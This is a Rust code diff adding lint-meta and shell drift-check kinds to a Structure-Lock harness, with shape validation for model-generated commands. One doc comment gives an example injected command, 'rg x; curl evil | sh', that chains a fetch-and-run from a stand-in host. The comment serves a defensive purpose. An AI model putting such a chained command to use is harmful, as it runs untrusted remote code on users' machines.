@@ -43,6 +43,16 @@ pub(super) enum HarnessCheckKind {
     AstGrep,
     /// An api-extractor API-report drift gate (verify mode, i.e. `run` WITHOUT `--local`).
     ApiExtractor,
+    /// Drift-v1 (T15): a lint-meta rule the EnforceRun executes with the machine-readable
+    /// `--json` reporter to COUNT a convention's violating sites (the substrate Nightcore
+    /// owns). Its `command` is model-generated, so the arm gate shape-validates it
+    /// (`super::command_guard`).
+    LintMeta,
+    /// Drift-v1 (T15): a shell/ripgrep `--count` check. Armable + shape-validated NOW, but
+    /// its drift EXECUTION/counting is a fast-follow (issue #187) — [`plan_check`] skips it
+    /// so it never runs (and so a `rg` exit-1 "no matches" can't be mistaken for a gate
+    /// failure). A model-generated `command`, so the arm gate shape-validates it.
+    Shell,
 }
 
 /// The wire kinds a Structure-Lock check may be ARMED / edited as — every kind the
@@ -61,7 +71,18 @@ pub(crate) const ARMABLE_CHECK_KINDS: &[&str] = &[
     "mutation-score",
     "ast-grep",
     "api-extractor",
+    // Drift-v1 (T15) substrates. Their `command` is model-generated, so the arm gate
+    // additionally shape-validates it (`super::command_guard::validate_check_command`).
+    "lint-meta",
+    "shell",
 ];
+
+/// The Drift-v1 substrate kinds whose `command` is MODEL-GENERATED (compiled by the
+/// harness synthesis pass), so the arm gate must shape-validate it before writing the
+/// manifest — an injected proposal could be `rg x; curl evil | sh`. Every other kind's
+/// command is hand-authored in the trusted UI. Greppable single source of truth for
+/// [`super::command_guard::validate_check_command`]'s applicability.
+pub(crate) const MODEL_GENERATED_COMMAND_KINDS: &[&str] = &["lint-meta", "shell"];
 
 /// Whether `kind` is a runnable/armable Structure-Lock check kind (exact,
 /// case-sensitive — wire kinds are kebab-case and a near-miss would arm a check
@@ -85,7 +106,17 @@ impl HarnessCheckKind {
             HarnessCheckKind::MutationScore => "mutation-score",
             HarnessCheckKind::AstGrep => "ast-grep",
             HarnessCheckKind::ApiExtractor => "api-extractor",
+            HarnessCheckKind::LintMeta => "lint-meta",
+            HarnessCheckKind::Shell => "shell",
         }
+    }
+
+    /// Whether this kind is a Drift-v1 (T15) substrate — a check an EnforceRun measures
+    /// for site-count drift (lint-meta via the `--json` reporter; shell/ripgrep counts).
+    /// The greppable classifier [`super::drift`] uses to decide which armed checks yield
+    /// a `ConventionDrift` record.
+    pub(super) fn is_drift_substrate(self) -> bool {
+        matches!(self, HarnessCheckKind::LintMeta | HarnessCheckKind::Shell)
     }
 
     /// Security-critical kinds are EXCLUDED from the runner's flaky-retry policy. A
@@ -133,6 +164,11 @@ struct HarnessCheckConfig {
     /// opt-OUT for a whole project.
     #[serde(default = "default_enabled")]
     enabled: bool,
+    /// Drift-v1 (T15): the `conventionFingerprint` a COMPILED check carries — the join
+    /// key an EnforceRun uses to attribute site counts back to a `ConventionDrift`.
+    /// Absent on every plain hardening/gate check (serde-additive ⇒ old manifests load).
+    #[serde(default)]
+    convention_fingerprint: Option<String>,
 }
 
 /// `enabled` defaults to `true`: a check the generator bothered to list is on
@@ -150,6 +186,9 @@ pub(super) struct PlannedCheck {
     pub(super) args: Vec<String>,
     /// The resolved per-check wall-clock timeout (config `timeoutMs` or the default).
     pub(super) timeout: std::time::Duration,
+    /// Drift-v1 (T15): the convention this check measures, when it is a compiled drift
+    /// check ([`HarnessCheckKind::is_drift_substrate`]). `None` for a plain gate check.
+    pub(super) convention_fingerprint: Option<String>,
 }
 
 /// Load + plan the enabled checks from `.nightcore/harness.json` in `dir`. Returns
@@ -203,6 +242,14 @@ pub(super) fn load_checks(dir: &Path) -> Vec<PlannedCheck> {
 /// platform resolver at spawn time for Windows-shim handling). `None` ⇒ no runnable
 /// command (warn-and-skip).
 fn plan_check(cfg: &HarnessCheckConfig) -> Option<PlannedCheck> {
+    // Drift-v1 (T15): the `shell` substrate is ARMABLE + shape-validated now, but its
+    // drift execution/counting is a fast-follow (issue #187). Skip planning it so it
+    // never runs — both so it can't yet be measured AND so a ripgrep exit-1 ("no
+    // matches") is never mistaken for a gate failure in task verification.
+    if cfg.kind == HarnessCheckKind::Shell {
+        tracing::debug!(target: "nightcore::structure_lock", name = %cfg.name, "shell drift check is armable but its execution is a fast-follow; skipping");
+        return None;
+    }
     let command = cfg.command.as_ref()?.trim().to_string();
     if command.is_empty() {
         return None;
@@ -224,5 +271,6 @@ fn plan_check(cfg: &HarnessCheckConfig) -> Option<PlannedCheck> {
         program,
         args,
         timeout,
+        convention_fingerprint: cfg.convention_fingerprint.clone(),
     })
 }
